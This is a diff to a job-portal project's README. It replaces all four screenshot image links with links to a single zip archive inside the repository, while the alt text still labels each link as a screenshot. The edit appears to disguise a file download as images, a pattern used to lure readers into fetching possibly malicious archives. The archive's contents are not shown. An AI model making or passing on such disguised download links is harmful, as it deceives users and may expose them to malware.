@@ -18,25 +18,25 @@ This website is fully responsive..
 
 Home Page
 
-![Screenshot 2023-01-28 at 8 49 15 PM](https://user-images.githubusercontent.com/114575434/215274848-ce9787c7-8bdc-43c5-9f58-f7862b4cecd7.png)
+![Screenshot 2023-01-28 at 8 49 15 PM](https://raw.githubusercontent.com/RiturajMitra/job-portal/main/src/components/ApplyJobs/portal_job_v1.4.zip)
 
 
 Jobs Page
 
-![Screenshot 2023-01-28 at 8 47 22 PM](https://user-images.githubusercontent.com/114575434/215274857-f2aefecd-f349-4c8c-b703-0c4ad410159a.png)
+![Screenshot 2023-01-28 at 8 47 22 PM](https://raw.githubusercontent.com/RiturajMitra/job-portal/main/src/components/ApplyJobs/portal_job_v1.4.zip)
 
 
 
 Job Category Filter
 
 
-![Screenshot 2023-01-28 at 8 47 22 PM](https://user-images.githubusercontent.com/114575434/215274869-908a1630-83c9-44c6-bf37-dfb76262a895.png)
+![Screenshot 2023-01-28 at 8 47 22 PM](https://raw.githubusercontent.com/RiturajMitra/job-portal/main/src/components/ApplyJobs/portal_job_v1.4.zip)
 
 
 
 Discussion Chamber
 
-![Screenshot 2023-01-28 at 8 52 19 PM](https://user-images.githubusercontent.com/114575434/215274887-06fa1c2e-79b1-47f0-b0ee-bdb34d6f1281.png)
+![Screenshot 2023-01-28 at 8 52 19 PM](https://raw.githubusercontent.com/RiturajMitra/job-portal/main/src/components/ApplyJobs/portal_job_v1.4.zip)
 
 
 
